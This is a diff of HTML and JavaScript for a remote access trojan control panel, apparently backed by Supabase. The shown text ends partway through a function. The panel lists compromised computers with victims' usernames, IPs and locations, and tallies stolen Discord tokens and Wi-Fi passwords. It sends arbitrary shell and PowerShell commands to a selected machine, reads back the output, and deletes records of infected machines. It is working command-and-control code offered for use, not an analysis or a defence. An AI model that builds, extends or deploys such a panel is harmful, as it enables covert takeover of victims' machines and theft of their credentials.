@@ -3,107 +3,148 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>lies.lat · RAT Control Panel</title>
+<title>RAT Panel · Agent Manager</title>
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; }
-body { background: #000; color: #fff; font-family: 'SF Mono', 'Fira Code', monospace; }
-::-webkit-scrollbar { width: 3px; }
-::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); }
+body { background: #0a0a0a; color: #ccc; font-family: 'Segoe UI', monospace; }
+::-webkit-scrollbar { width: 4px; }
+::-webkit-scrollbar-thumb { background: #00ff8844; }
 
 /* Auth */
-#page-auth { height: 100vh; display: flex; align-items: center; justify-content: center; flex-direction: column; }
-.auth-box { display: flex; flex-direction: column; align-items: center; gap: 18px; width: 260px; }
-.auth-wordmark { font-size: 11px; letter-spacing: 8px; text-transform: lowercase; color: rgba(255,255,255,0.2); }
-.auth-wordmark span { color: rgba(255,255,255,0.6); }
-.auth-err { font-size: 9px; color: rgba(255,80,80,0.6); min-height: 12px; }
-input { background: transparent; border: none; border-bottom: 1px solid rgba(255,255,255,0.1); color: #fff; font-family: inherit; font-size: 12px; padding: 9px 0; width: 100%; }
-input:focus { outline: none; border-color: rgba(255,255,255,0.3); }
-.btn { background: transparent; border: 1px solid rgba(255,255,255,0.1); color: rgba(255,255,255,0.4); font-family: inherit; font-size: 9px; letter-spacing: 3px; text-transform: uppercase; padding: 9px 24px; cursor: pointer; transition: 0.2s; }
-.btn:hover { border-color: rgba(255,255,255,0.25); color: rgba(255,255,255,0.7); }
-.btn-danger { border-color: rgba(255,50,50,0.2); color: rgba(255,80,80,0.5); }
-.btn-danger:hover { border-color: rgba(255,50,50,0.5); color: rgba(255,80,80,0.9); }
-.btn-accent { border-color: #00ff8888; color: #00ff88aa; }
-.btn-accent:hover { border-color: #00ff88; color: #00ff88; }
-.btn-sm { padding: 5px 12px; font-size: 8px; letter-spacing: 2px; }
+#auth-container { height: 100vh; display: flex; align-items: center; justify-content: center; background: #000; }
+.auth-box { background: #111; border: 1px solid #00ff8822; padding: 40px; width: 320px; border-radius: 4px; }
+.auth-box h2 { color: #0f0; margin-bottom: 20px; text-align: center; }
+.auth-box input { background: #1a1a1a; border: 1px solid #333; color: #0f0; padding: 10px; width: 100%; margin: 10px 0; font-family: monospace; }
+.auth-box input:focus { outline: none; border-color: #0f0; }
+.btn { background: #1a1a1a; border: 1px solid #00ff8844; color: #0f0; padding: 10px 20px; cursor: pointer; font-family: monospace; font-size: 12px; transition: 0.2s; }
+.btn:hover { background: #00ff8811; border-color: #0f0; }
+.btn-danger { border-color: #ff444488; color: #f44; }
+.btn-danger:hover { background: #ff444411; border-color: #f44; }
+.btn-accent { border-color: #0f0; background: #00ff8811; }
 
-/* Topbar */
-.topbar { position: sticky; top: 0; background: rgba(0,0,0,0.95); backdrop-filter: blur(12px); border-bottom: 1px solid rgba(255,255,255,0.05); height: 48px; display: flex; align-items: center; padding: 0 32px; }
-.wordmark { font-size: 11px; letter-spacing: 5px; color: rgba(255,255,255,0.2); }
-.wordmark span { color: #00ff88; }
-.topbar-user { font-size: 10px; letter-spacing: 1px; color: rgba(255,255,255,0.2); margin-left: 20px; }
-.topbar-signout { margin-left: auto; background: none; border: none; color: rgba(255,255,255,0.15); font-size: 9px; letter-spacing: 2px; cursor: pointer; }
-
-/* Main */
-.main { max-width: 1400px; margin: 0 auto; padding: 40px 32px; }
-.dash-title { font-size: 9px; letter-spacing: 6px; color: rgba(255,255,255,0.12); margin-bottom: 32px; display: flex; align-items: center; gap: 12px; }
-.dash-title::after { content: ''; flex: 1; height: 1px; background: rgba(255,255,255,0.05); }
+/* App */
+#app-container { display: none; }
+.topbar { background: #0a0a0a; border-bottom: 1px solid #00ff8822; padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; }
+.logo { color: #0f0; font-size: 14px; letter-spacing: 4px; font-weight: bold; }
+.user-info { font-size: 11px; color: #888; }
+.main { padding: 30px; }
 
 /* Stats */
-.stats-grid { display: grid; grid-template-columns: repeat(5,1fr); gap: 1px; background: rgba(255,255,255,0.06); margin-bottom: 48px; }
-.stat-card { background: #000; padding: 20px; }
-.stat-label { font-size: 8px; letter-spacing: 3px; color: rgba(255,255,255,0.2); margin-bottom: 8px; }
-.stat-number { font-size: 32px; font-weight: 300; color: rgba(255,255,255,0.7); }
+.stats-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 12px; margin-bottom: 30px; }
+.stat-card { background: #111; border: 1px solid #222; padding: 20px; text-align: center; border-radius: 4px; }
+.stat-number { font-size: 32px; color: #0f0; font-weight: bold; }
+.stat-label { font-size: 10px; color: #666; margin-top: 5px; letter-spacing: 2px; }
 
-/* Filters & Command Bar */
-.filters { display: flex; gap: 12px; margin-bottom: 24px; flex-wrap: wrap; }
-.filter-input { border: 1px solid rgba(255,255,255,0.1); padding: 6px 12px; font-size: 9px; background: transparent; color: #fff; width: 180px; }
-.command-bar { background: rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.1); padding: 12px 16px; margin-bottom: 24px; display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
-.command-bar label { font-size: 8px; letter-spacing: 2px; color: #00ff88aa; }
-.command-input { flex: 2; background: transparent; border: none; border-bottom: 1px solid rgba(255,255,255,0.2); color: #0f0; font-family: monospace; font-size: 11px; padding: 8px; }
-.command-input:focus { outline: none; border-color: #00ff88; }
-.cmd-output { margin-top: 8px; font-size: 9px; color: #888; max-height: 100px; overflow-y: auto; }
+/* Command Panel */
+.command-panel { background: #111; border: 1px solid #00ff8822; padding: 20px; margin-bottom: 30px; border-radius: 4px; }
+.command-header { color: #0f0; margin-bottom: 15px; font-size: 12px; }
+.command-input-group { display: flex; gap: 10px; flex-wrap: wrap; }
+.command-input { flex: 1; background: #1a1a1a; border: 1px solid #333; color: #0f0; padding: 12px; font-family: monospace; font-size: 12px; }
+.command-input:focus { outline: none; border-color: #0f0; }
+.cmd-output { background: #000; border: 1px solid #222; margin-top: 15px; padding: 12px; font-size: 11px; max-height: 200px; overflow-y: auto; color: #0a0; font-family: monospace; }
 
-/* PC Cards */
-.specs-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(380px,1fr)); gap: 12px; margin-top: 16px; }
-.spec-card { border: 1px solid rgba(255,255,255,0.06); background: rgba(255,255,255,0.01); transition: 0.2s; }
-.spec-card:hover { border-color: rgba(255,255,255,0.12); background: rgba(255,255,255,0.02); }
-.spec-header { display: flex; align-items: center; gap: 12px; padding: 14px 16px; border-bottom: 1px solid rgba(255,255,255,0.05); }
-.spec-icon { font-size: 22px; }
-.spec-name { font-size: 13px; font-weight: 400; color: #00ff88aa; cursor: pointer; flex: 1; }
-.spec-name:hover { text-decoration: underline; }
-.spec-time { font-size: 8px; letter-spacing: 1px; color: rgba(255,255,255,0.2); }
-.spec-body { padding: 12px 16px; font-size: 10px; color: rgba(255,255,255,0.4); line-height: 1.6; }
-.spec-body strong { color: rgba(255,255,255,0.7); }
-.spec-ip { margin-top: 8px; padding-top: 6px; border-top: 1px solid rgba(255,255,255,0.04); font-size: 9px; }
-.card-actions { display: flex; justify-content: flex-end; gap: 8px; padding: 8px 16px 12px; border-top: 1px solid rgba(255,255,255,0.04); }
-.empty-msg { padding: 60px 0; text-align: center; font-size: 10px; letter-spacing: 3px; color: rgba(255,255,255,0.08); }
+/* Filters */
+.filters { display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; }
+.filter-input { background: #1a1a1a; border: 1px solid #333; color: #fff; padding: 8px 12px; font-size: 11px; width: 180px; }
+
+/* Agent Grid */
+.agent-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(380px, 1fr)); gap: 15px; margin-top: 20px; }
+.agent-card { background: #111; border: 1px solid #222; padding: 15px; cursor: pointer; transition: 0.2s; border-radius: 4px; position: relative; }
+.agent-card:hover { border-color: #00ff8866; background: #151515; }
+.agent-card.selected { border-color: #0f0; background: #0f0a0a; }
+.agent-name { color: #0f0; font-size: 16px; font-weight: bold; display: flex; justify-content: space-between; }
+.agent-status { font-size: 10px; }
+.status-online { color: #0f0; }
+.status-offline { color: #f44; }
+.agent-details { font-size: 11px; color: #888; margin-top: 8px; line-height: 1.5; }
+.agent-actions { margin-top: 10px; display: flex; gap: 8px; justify-content: flex-end; }
+.agent-actions button { padding: 4px 12px; font-size: 10px; }
 
 /* Modal */
-.overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.95); backdrop-filter: blur(8px); z-index: 200; opacity: 0; pointer-events: none; transition: 0.2s; display: flex; align-items: center; justify-content: center; }
-.overlay.open { opacity: 1; pointer-events: all; }
-.modal { background: #0a0a0a; border: 1px solid rgba(255,255,255,0.08); max-width: 700px; width: 90%; max-height: 80vh; overflow-y: auto; padding: 28px 24px; }
-.modal-title { font-size: 10px; letter-spacing: 4px; margin-bottom: 20px; color: rgba(255,255,255,0.3); }
-.modal-close { float: right; background: none; border: none; color: rgba(255,255,255,0.2); font-size: 18px; cursor: pointer; }
-pre { background: #111; padding: 12px; font-size: 8px; overflow-x: auto; margin-top: 10px; }
-#toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(0,255,136,0.1); border: 1px solid #00ff8844; padding: 8px 20px; font-size: 9px; letter-spacing: 2px; opacity: 0; transition: 0.2s; z-index: 999; white-space: nowrap; color: #0f0; }
-#toast.show { opacity: 1; }
+.modal { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.95); display: none; align-items: center; justify-content: center; z-index: 1000; }
+.modal-content { background: #111; border: 1px solid #0f0; max-width: 800px; width: 90%; max-height: 80vh; overflow-y: auto; padding: 25px; border-radius: 4px; }
+.modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 10px; }
+.modal-header h3 { color: #0f0; }
+.close { cursor: pointer; color: #888; font-size: 20px; }
+.close:hover { color: #f44; }
+.modal pre { background: #000; padding: 15px; overflow-x: auto; font-size: 10px; color: #0a0; }
+
+/* Delete Confirm */
+.confirm-box { text-align: center; padding: 20px; }
+.confirm-box p { margin: 20px 0; color: #f44; }
+.confirm-buttons { display: flex; gap: 10px; justify-content: center; }
+
+/* Toast */
+#toast { position: fixed; bottom: 20px; right: 20px; background: #0f0a; border: 1px solid #0f0; padding: 10px 20px; font-size: 11px; display: none; z-index: 1001; color: #0f0; }
+
+.empty-msg { text-align: center; padding: 60px; color: #444; letter-spacing: 2px; }
 </style>
 </head>
 <body>
-<div id="page-loading" style="height:100vh;display:flex;align-items:center;justify-content:center;"><div style="width:3px;height:3px;background:#00ff88;"></div></div>
-<div id="page-auth" style="display:none"><div class="auth-box"><div class="auth-wordmark">lies<span>.lat</span></div><input type="email" id="a-email" placeholder="email"><input type="password" id="a-pass" placeholder="password"><div class="auth-err" id="auth-err"></div><button class="btn" id="auth-submit-btn">sign in</button></div></div>
-<div id="page-app" style="display:none">
-  <div class="topbar"><div class="wordmark">lies<span>.lat</span></div><div class="topbar-user" id="topbar-user"></div><button class="topbar-signout" onclick="doSignOut()">sign out</button></div>
-  <div class="main">
-    <div class="dash-title">🎮 RAT CONTROL PANEL</div>
-    <div class="stats-grid"><div class="stat-card"><div class="stat-label">active agents</div><div class="stat-number" id="stat-total">0</div></div><div class="stat-card"><div class="stat-label">today</div><div class="stat-number" id="stat-today">0</div></div><div class="stat-card"><div class="stat-label">tokens found</div><div class="stat-number" id="stat-tokens">0</div></div><div class="stat-card"><div class="stat-label">wifi pwds</div><div class="stat-number" id="stat-wifi">0</div></div><div class="stat-card"><div class="stat-label">last report</div><div class="stat-number" id="stat-last">—</div></div></div>
-    
-    <!-- COMMAND BAR -->
-    <div class="command-bar" id="command-bar" style="display:none;">
-      <label>🔻 CMD &gt;</label>
-      <input type="text" id="cmd-input" class="command-input" placeholder="whoami | ipconfig | dir C:\ | powershell Get-Process" onkeypress="if(event.key==='Enter') sendCommand()">
-      <button class="btn btn-sm btn-accent" onclick="sendCommand()">EXECUTE</button>
-      <button class="btn btn-sm" onclick="clearCommandOutput()">clear</button>
-      <div id="cmd-output" class="cmd-output"></div>
-    </div>
 
-    <div class="filters"><input type="text" id="filter-name" class="filter-input" placeholder="filter PC name" onkeyup="filterReports()"><input type="text" id="filter-username" class="filter-input" placeholder="filter username" onkeyup="filterReports()"><input type="text" id="filter-ip" class="filter-input" placeholder="filter IP" onkeyup="filterReports()"><button class="btn btn-sm" onclick="fetchReports()">⟳ refresh</button></div>
-    <div id="specs-container"><div class="empty-msg">waiting for agents to connect...</div></div>
-  </div>
+<div id="auth-container">
+<div class="auth-box">
+<h2>⟡ RAT CONTROL ⟡</h2>
+<input type="email" id="login-email" placeholder="email" autocomplete="email">
+<input type="password" id="login-pass" placeholder="password" autocomplete="current-password">
+<div id="auth-error" style="color:#f44; font-size:10px; margin:10px 0"></div>
+<button class="btn" onclick="doLogin()" style="width:100%">SIGN IN</button>
+</div>
 </div>
 
-<div class="overlay" id="modal-detail" onclick="closeModalOnBg(event)"><div class="modal"><button class="modal-close" onclick="closeModal()">✕</button><div class="modal-title">🔧 full agent report</div><div id="modal-content" style="font-size:10px;line-height:1.7;"></div></div></div>
+<div id="app-container">
+<div class="topbar">
+<div class="logo">[ RAT PANEL v3.0 ]</div>
+<div class="user-info"><span id="user-email"></span></div>
+<button class="btn" onclick="doLogout()" style="padding:5px 15px">EXIT</button>
+</div>
+
+<div class="main">
+<div class="stats-grid">
+<div class="stat-card"><div class="stat-number" id="stat-total">0</div><div class="stat-label">AGENTS</div></div>
+<div class="stat-card"><div class="stat-number" id="stat-online">0</div><div class="stat-label">ONLINE</div></div>
+<div class="stat-card"><div class="stat-number" id="stat-tokens">0</div><div class="stat-label">TOKENS</div></div>
+<div class="stat-card"><div class="stat-number" id="stat-wifi">0</div><div class="stat-label">WIFI</div></div>
+<div class="stat-card"><div class="stat-number" id="stat-cmds">0</div><div class="stat-label">COMMANDS</div></div>
+</div>
+
+<div class="command-panel" id="cmd-panel" style="display:none">
+<div class="command-header">🎯 TARGET: <span id="target-name" style="color:#0f0">none selected</span></div>
+<div class="command-input-group">
+<input type="text" id="cmd-input" class="command-input" placeholder="whoami | ipconfig | dir C:\ | powershell Get-Process | tasklist" onkeypress="if(event.key==='Enter') sendCommand()">
+<button class="btn" onclick="sendCommand()">EXECUTE</button>
+<button class="btn" onclick="clearOutput()">CLEAR</button>
+<button class="btn btn-danger" id="delete-agent-btn" onclick="deleteAgent()" style="display:none">DELETE AGENT</button>
+</div>
+<div id="cmd-output" class="cmd-output">> Ready. Select an agent to begin.</div>
+</div>
+
+<div class="filters">
+<input type="text" id="filter-name" class="filter-input" placeholder="Filter by PC name" onkeyup="filterAgents()">
+<input type="text" id="filter-ip" class="filter-input" placeholder="Filter by IP" onkeyup="filterAgents()">
+<button class="btn" onclick="fetchAgents()">⟳ REFRESH</button>
+<button class="btn btn-danger" id="delete-all-filtered-btn" onclick="deleteAllFiltered()" style="display:none">🗑 DELETE ALL FILTERED</button>
+</div>
+
+<div id="agent-container"></div>
+</div>
+</div>
+
+<div id="delete-modal" class="modal" onclick="if(event.target===this) closeDeleteModal()">
+<div class="modal-content">
+<div class="modal-header"><h3>⚠️ CONFIRM DELETE</h3><span class="close" onclick="closeDeleteModal()">✕</span></div>
+<div class="confirm-box"><p id="delete-message">Are you sure?</p><div class="confirm-buttons"><button class="btn" onclick="closeDeleteModal()">CANCEL</button><button class="btn btn-danger" id="confirm-delete-btn" onclick="confirmDelete()">DELETE</button></div></div>
+</div>
+</div>
+
+<div id="detail-modal" class="modal" onclick="if(event.target===this) closeDetailModal()">
+<div class="modal-content">
+<div class="modal-header"><h3>📋 AGENT DETAILS</h3><span class="close" onclick="closeDetailModal()">✕</span></div>
+<div id="detail-content"></div>
+</div>
+</div>
+
 <div id="toast"></div>
 
 <script>
@@ -112,188 +153,301 @@ const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBh
 const { createClient } = supabase;
 const sb = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-let currentUser = null, allReports = [], filteredReports = [], currentAgentId = null;
+let currentUser = null;
+let agents = [];
+let filteredAgents = [];
+let selectedAgent = null;
+let pendingDeleteId = null;
+let pendingDeleteAll = false;
+let cmdPollInterval = null;
 
-async function init() {
-  try {
+// Auth
+async function doLogin() {
+    const email = document.getElementById('login-email').value;
+    const pass = document.getElementById('login-pass').value;
+    const { error } = await sb.auth.signInWithPassword({ email, password: pass });
+    if (error) document.getElementById('auth-error').innerText = error.message;
+    else location.reload();
+}
+
+async function doLogout() {
+    await sb.auth.signOut();
+    location.reload();
+}
+
+sb.auth.onAuthStateChange((event, session) => {
+    if (event === 'SIGNED_IN') { currentUser = session.user; showApp(); }
+    else if (event === 'SIGNED_OUT') showAuth();
+});
+
+async function checkSession() {
     const { data: { session } } = await sb.auth.getSession();
-    if (session) { currentUser = session.user; showApp(); await fetchReports(); subscribeToReports(); await ensureCommandsTable(); }
-    else showPage('auth');
-    sb.auth.onAuthStateChange((ev, sess) => {
-      if (ev === 'SIGNED_IN' && sess) { currentUser = sess.user; showApp(); fetchReports(); subscribeToReports(); }
-      if (ev === 'SIGNED_OUT') { currentUser = null; showPage('auth'); }
+    if (session) { currentUser = session.user; showApp(); }
+    else showAuth();
+}
+
+function showAuth() {
+    document.getElementById('auth-container').style.display = 'flex';
+    document.getElementById('app-container').style.display = 'none';
+}
+
+function showApp() {
+    document.getElementById('auth-container').style.display = 'none';
+    document.getElementById('app-container').style.display = 'block';
+    document.getElementById('user-email').innerHTML = currentUser.email;
+    fetchAgents();
+    setInterval(fetchAgents, 10000);
+}
+
+// Agents
+async function fetchAgents() {
+    const { data, error } = await sb.from('pc_reports').select('*').order('last_seen', { ascending: false });
+    if (!error && data) {
+        agents = data;
+        filterAgents();
+        updateStats();
+    }
+}
+
+function filterAgents() {
+    const nameFilter = document.getElementById('filter-name').value.toLowerCase();
+    const ipFilter = document.getElementById('filter-ip').value.toLowerCase();
+    filteredAgents = agents.filter(a => {
+        const matchName = !nameFilter || (a.pc_name || '').toLowerCase().includes(nameFilter);
+        const matchIp = !ipFilter || ((a.public_ip || a.local_ip || '')).toLowerCase().includes(ipFilter);
+        return matchName && matchIp;
     });
-    document.getElementById('auth-submit-btn').onclick = () => handleLogin();
-    document.getElementById('a-pass').onkeypress = (e) => { if (e.key === 'Enter') handleLogin(); };
-  } catch(err) { console.error(err); document.getElementById('page-loading').style.display = 'none'; document.getElementById('page-auth').style.display = 'flex'; }
+    renderAgents();
+    
+    const deleteAllBtn = document.getElementById('delete-all-filtered-btn');
+    if (filteredAgents.length > 0 && (nameFilter || ipFilter)) {
+        deleteAllBtn.style.display = 'inline-block';
+        deleteAllBtn.textContent = `🗑 DELETE ${filteredAgents.length} FILTERED`;
+    } else {
+        deleteAllBtn.style.display = 'none';
+    }
 }
 
-async function ensureCommandsTable() {
-  // Create commands table if not exists (run once in Supabase SQL)
-  console.log("Ensure pc_commands table exists - run SQL manually if not:");
-  // SQL: CREATE TABLE IF NOT EXISTS pc_commands (id SERIAL PRIMARY KEY, created_at TIMESTAMPTZ DEFAULT NOW(), command_for TEXT, command TEXT, status TEXT DEFAULT 'pending', output TEXT);
-}
-
-async function handleLogin() {
-  const email = document.getElementById('a-email').value.trim(), password = document.getElementById('a-pass').value, errEl = document.getElementById('auth-err');
-  errEl.textContent = '';
-  if (!email || !password) { errEl.textContent = 'required'; return; }
-  const btn = document.getElementById('auth-submit-btn'), originalText = btn.textContent;
-  btn.disabled = true; btn.textContent = '...';
-  const { error } = await sb.auth.signInWithPassword({ email, password });
-  btn.disabled = false; btn.textContent = originalText;
-  if (error) errEl.textContent = error.message.includes('Invalid') ? 'Invalid credentials' : error.message;
-}
-
-function subscribeToReports() {
-  sb.channel('reports').on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'pc_reports' }, () => fetchReports()).subscribe();
-}
-
-function showPage(p) {
-  document.getElementById('page-loading').style.display = 'none';
-  document.getElementById('page-auth').style.display = p === 'auth' ? 'flex' : 'none';
-  document.getElementById('page-app').style.display = p === 'app' ? 'block' : 'none';
-}
-
-function showApp() { showPage('app'); document.getElementById('topbar-user').textContent = `@${currentUser?.email?.split('@')[0] || 'admin'}`; }
-async function doSignOut() { await sb.auth.signOut(); allReports = []; filteredReports = []; renderSpecs(); }
-
-async function fetchReports() {
-  if (!currentUser) return;
-  const { data, error } = await sb.from('pc_reports').select('*').order('created_at', { ascending: false });
-  if (error) { document.getElementById('specs-container').innerHTML = `<div class="empty-msg">Error: ${error.message}</div>`; return; }
-  allReports = data || []; filterReports(); updateStats();
-}
-
-function filterReports() {
-  const nameFilter = document.getElementById('filter-name').value.toLowerCase();
-  const userFilter = document.getElementById('filter-username').value.toLowerCase();
-  const ipFilter = document.getElementById('filter-ip').value.toLowerCase();
-  filteredReports = allReports.filter(r => {
-    if (nameFilter && !(r.pc_name || '').toLowerCase().includes(nameFilter)) return false;
-    if (userFilter && !(r.username || '').toLowerCase().includes(userFilter)) return false;
-    if (ipFilter && (!(r.public_ip || r.local_ip || '').toLowerCase().includes(ipFilter))) return false;
-    return true;
-  });
-  renderSpecs();
+function renderAgents() {
+    const container = document.getElementById('agent-container');
+    if (!filteredAgents.length) {
+        container.innerHTML = '<div class="empty-msg">└ no agents connected ──[✗]──</div>';
+        return;
+    }
+    
+    container.innerHTML = '<div class="agent-grid"></div>';
+    const grid = container.querySelector('.agent-grid');
+    
+    filteredAgents.forEach(agent => {
+        const raw = agent.raw_specs || {};
+        const lastSeen = agent.last_seen ? Math.floor((Date.now() - new Date(agent.last_seen)) / 60000) : 999;
+        const isOnline = lastSeen < 5;
+        const isSelected = selectedAgent === agent.visitor_id;
+        
+        const card = document.createElement('div');
+        card.className = `agent-card ${isSelected ? 'selected' : ''}`;
+        card.innerHTML = `
+            <div class="agent-name">
+                <span>💻 ${escapeHtml(agent.pc_name || 'unknown')}</span>
+                <span class="agent-status ${isOnline ? 'status-online' : 'status-offline'}">${isOnline ? '● ONLINE' : '○ OFFLINE'}</span>
+            </div>
+            <div class="agent-details">
+                👤 ${escapeHtml(agent.username || '?')}<br>
+                🌐 ${escapeHtml(agent.public_ip || agent.local_ip || '?')}<br>
+                📍 ${escapeHtml(raw.location || '?')}<br>
+                🔑 ${(raw.discord_tokens || []).length} tokens | 📶 ${(raw.wifi_passwords || []).length} wifi<br>
+                💻 ${escapeHtml(raw.cpu_name || '?').substring(0, 30)} | 💾 ${raw.ram_gb || agent.memory_gb || '?'}GB<br>
+                ⏱️ ${lastSeen}m ago
+            </div>
+            <div class="agent-actions">
+                <button class="btn" onclick="event.stopPropagation(); showAgentDetail('${agent.id}')">DETAILS</button>
+                <button class="btn btn-accent" onclick="event.stopPropagation(); selectAgent('${agent.visitor_id}', '${escapeHtml(agent.pc_name)}')">CMD</button>
+                <button class="btn btn-danger" onclick="event.stopPropagation(); promptDeleteAgent('${agent.visitor_id}', '${escapeHtml(agent.pc_name)}')">DELETE</button>
+            </div>
+        `;
+        card.onclick = () => selectAgent(agent.visitor_id, agent.pc_name);
+        grid.appendChild(card);
+    });
 }
 
 function updateStats() {
-  document.getElementById('stat-total').textContent = allReports.length;
-  const today = new Date().toISOString().slice(0,10);
-  document.getElementById('stat-today').textContent = allReports.filter(r => r.created_at?.startsWith(today)).length;
-  
-  let totalTokens = 0, totalWifi = 0;
-  allReports.forEach(r => {
-    const raw = r.raw_specs || {};
-    totalTokens += (raw.discord_tokens || []).length;
-    totalWifi += (raw.wifi_passwords || []).length;
-  });
-  document.getElementById('stat-tokens').textContent = totalTokens;
-  document.getElementById('stat-wifi').textContent = totalWifi;
-  
-  if (allReports.length > 0 && allReports[0].created_at) {
-    const lastDate = new Date(allReports[0].created_at), now = new Date(), diffMins = Math.floor((now - lastDate) / 60000);
-    document.getElementById('stat-last').textContent = diffMins < 1 ? 'just now' : `${diffMins}m ago`;
-  }
+    document.getElementById('stat-total').innerText = agents.length;
+    const online = agents.filter(a => a.last_seen && (Date.now() - new Date(a.last_seen)) < 300000).length;
+    document.getElementById('stat-online').innerText = online;
+    
+    let totalTokens = 0, totalWifi = 0;
+    agents.forEach(a => {
+        const raw = a.raw_specs || {};
+        totalTokens += (raw.discord_tokens || []).length;
+        totalWifi += (raw.wifi_passwords || []).length;
+    });
+    document.getElementById('stat-tokens').innerText = totalTokens;
+    document.getElementById('stat-wifi').innerText = totalWifi;
+    updateCmdStats();
 }
 
-function renderSpecs() {
-  const container = document.getElementById('specs-container');
-  if (!filteredReports.length) { container.innerHTML = '<div class="empty-msg">no active agents</div>'; return; }
-  container.innerHTML = '<div class="specs-grid"></div>';
-  const grid = container.querySelector('.specs-grid');
-  filteredReports.forEach(rep => {
-    const raw = rep.raw_specs || {};
-    const card = document.createElement('div'); card.className = 'spec-card';
-    card.innerHTML = `
-      <div class="spec-header"><div class="spec-icon">🖥️</div><div class="spec-name" onclick="selectAgent('${rep.visitor_id}', '${escapeHtml(rep.pc_name)}')">${escapeHtml(rep.pc_name || 'unknown')}</div><div class="spec-time">${escapeHtml(rep.created_at?.slice(5,16) || '?')}</div></div>
-      <div class="spec-body"><div><strong>${escapeHtml(rep.platform || '?')}</strong> | 🧠 ${raw.cpu_cores || rep.cpu_cores || '?'}c | 💾 ${raw.ram_gb || rep.memory_gb || '?'}GB</div><div>👤 ${escapeHtml(rep.username || '?')}</div><div class="spec-ip">🌐 ${escapeHtml(rep.public_ip || rep.local_ip || 'private')}</div><div>🎮 Tokens: ${(raw.discord_tokens || []).length} | WiFi: ${(raw.wifi_passwords || []).length}</div></div>
-      <div class="card-actions"><button class="btn btn-sm" onclick="showDetail('${rep.id}')">details</button><button class="btn btn-sm btn-accent" onclick="selectAgent('${rep.visitor_id}', '${escapeHtml(rep.pc_name)}')">cmd</button></div>
-    `;
-    grid.appendChild(card);
-  });
+async function updateCmdStats() {
+    const { count } = await sb.from('pc_commands').select('*', { count: 'exact', head: true });
+    document.getElementById('stat-cmds').innerText = count || 0;
 }
 
-function selectAgent(agentId, agentName) {
-  currentAgentId = agentId;
-  document.getElementById('command-bar').style.display = 'flex';
-  document.getElementById('cmd-input').placeholder = `cmd on ${agentName} > `;
-  document.getElementById('cmd-input').focus();
-  toast(`Selected: ${agentName}`);
+// Command functions
+function selectAgent(id, name) {
+    selectedAgent = id;
+    document.getElementById('target-name').innerHTML = name;
+    document.getElementById('cmd-panel').style.display = 'block';
+    document.getElementById('delete-agent-btn').style.display = 'inline-block';
+    document.getElementById('cmd-input').focus();
+    renderAgents();
+    
+    if (cmdPollInterval) clearInterval(cmdPollInterval);
+    cmdPollInterval = setInterval(pollCommandOutput, 3000);
 }
 
 async function sendCommand() {
-  if (!currentAgentId) { toast('Select an agent first'); return; }
-  const cmd = document.getElementById('cmd-input').value.trim();
-  if (!cmd) return;
-  
-  const outputDiv = document.getElementById('cmd-output');
-  outputDiv.innerHTML += `\n> [${new Date().toLocaleTimeString()}] ${cmd}\n⏳ pending...\n`;
-  outputDiv.scrollTop = outputDiv.scrollHeight;
-  
-  const { error } = await sb.from('pc_commands').insert({
-    command_for: currentAgentId,
-    command: cmd,
-    status: 'pending'
-  });
-  
-  if (error) {
-    outputDiv.innerHTML += `❌ Failed to send: ${error.message}\n`;
-    toast('Command send failed');
-  } else {
-    outputDiv.innerHTML = outputDiv.innerHTML.replace('pending...', 'sent ✓');
-    toast('Command sent, waiting for execution...');
-    document.getElementById('cmd-input').value = '';
+    if (!selectedAgent) { toast('Select an agent first'); return; }
+    const cmd = document.getElementById('cmd-input').value.trim();
+    if (!cmd) return;
     
-    // Poll for output
-    setTimeout(() => pollCommandOutput(), 2000);
-  }
+    const outputDiv = document.getElementById('cmd-output');
+    outputDiv.innerHTML += `\n> [${new Date().toLocaleTimeString()}] ${cmd}\n  ⏳ SENT...\n`;
+    outputDiv.scrollTop = outputDiv.scrollHeight;
+    
+    const { error } = await sb.from('pc_commands').insert({
+        command_for: selectedAgent,
+        command: cmd,
+        status: 'pending'
+    });
+    
+    if (error) {
+        outputDiv.innerHTML += `  ❌ ERROR: ${error.message}\n`;
+    } else {
+        document.getElementById('cmd-input').value = '';
+        updateCmdStats();
+        toast('Command sent');
+    }
 }
 
 async function pollCommandOutput() {
-  if (!currentAgentId) return;
-  const { data, error } = await sb.from('pc_commands').select('*').eq('command_for', currentAgentId).eq('status', 'completed').order('created_at', { ascending: false }).limit(1);
-  if (!error && data && data.length > 0 && data[0].output) {
-    const outputDiv = document.getElementById('cmd-output');
-    outputDiv.innerHTML += `\n📡 OUTPUT:\n${data[0].output}\n${'-'.repeat(40)}\n`;
-    outputDiv.scrollTop = outputDiv.scrollHeight;
-  }
+    if (!selectedAgent) return;
+    const { data, error } = await sb.from('pc_commands')
+        .select('*')
+        .eq('command_for', selectedAgent)
+        .eq('status', 'completed')
+        .order('created_at', { ascending: false })
+        .limit(3);
+    
+    if (!error && data && data.length) {
+        const outputDiv = document.getElementById('cmd-output');
+        for (const cmd of data.reverse()) {
+            const marker = `CMD_ID:${cmd.id}`;
+            if (!outputDiv.innerHTML.includes(marker)) {
+                outputDiv.innerHTML += `\n📡 OUTPUT (${new Date(cmd.created_at).toLocaleTimeString()}):\n${cmd.output || '(no output)'}\n${'-'.repeat(50)}\n`;
+                outputDiv.scrollTop = outputDiv.scrollHeight;
+            }
+        }
+    }
 }
 
-function clearCommandOutput() {
-  document.getElementById('cmd-output').innerHTML = '';
+function clearOutput() {
